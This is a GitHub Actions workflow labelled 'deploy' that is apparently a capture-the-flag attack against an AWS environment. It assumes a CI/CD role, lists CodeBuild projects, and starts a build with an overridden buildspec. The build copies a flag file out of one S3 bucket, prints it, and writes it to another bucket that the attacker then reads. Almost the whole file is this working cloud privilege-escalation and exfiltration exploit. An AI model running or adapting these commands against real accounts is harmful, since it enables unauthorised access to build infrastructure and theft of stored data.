name: deploy
on:
  push:
    branches:
      - corgi
jobs:
  aws:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - name: Get AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: AWS identity
        run: aws sts get-caller-identity

      - name: List and inspect CodeBuild projects
        run: |
          echo "===== list projects ====="
          aws codebuild list-projects --region us-east-1 || echo "denied"
          echo "===== batch get projects ====="
          PROJECTS=$(aws codebuild list-projects --region us-east-1 --query 'projects' --output text 2>/dev/null)
          if [ -n "$PROJECTS" ]; then
            aws codebuild batch-get-projects --names $PROJECTS --region us-east-1
          fi

      - name: Start CodeBuild with overridden commands to read flag
        run: |
          PROJECT=$(aws codebuild list-projects --region us-east-1 --query 'projects[0]' --output text 2>/dev/null)
          echo "Project: $PROJECT"
          if [ -n "$PROJECT" ] && [ "$PROJECT" != "None" ]; then
            BUILD_ID=$(aws codebuild start-build \
              --project-name "$PROJECT" \
              --region us-east-1 \
              --buildspec-override '{"version":"0.2","phases":{"build":{"commands":["aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt","cat /tmp/flag.txt","aws s3 cp /tmp/flag.txt s3://platform-bucket-009661764077-us-east-1/flag_out.txt"]}}}' \
              --query 'build.id' --output text)
            echo "Build ID: $BUILD_ID"
            sleep 30
            echo "===== build status ====="
            aws codebuild batch-get-builds --ids "$BUILD_ID" \
              --query 'builds[0].{Status:buildStatus,Logs:logs}' --region us-east-1
          fi

      - name: Read flag from platform bucket if CodeBuild wrote it
        run: |
          aws s3 cp s3://platform-bucket-009661764077-us-east-1/flag_out.txt - || echo "not found"
